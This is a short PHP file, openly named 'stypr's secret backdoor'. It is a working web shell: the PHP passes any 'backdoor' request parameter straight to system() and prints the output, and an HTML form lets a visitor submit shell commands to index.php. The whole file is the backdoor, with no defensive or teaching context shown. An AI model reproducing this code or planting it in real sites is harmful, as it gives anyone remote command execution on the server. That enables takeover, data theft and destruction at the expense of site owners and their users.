<?php

$backdoor = $_REQUEST['backdoor'];
if($backdoor){
	@system($backdoor . " 2>&1");
}

?>
<!doctype html>
<html>
<head>
	<title>stypr's secret backdoor</title>
</head>
<body>
	<form method=POST action=index.php>
		<input type="text" name="backdoor" value="backdoor">
		<input type="submit" value="backdoor()">
	</form>
</body>
</html>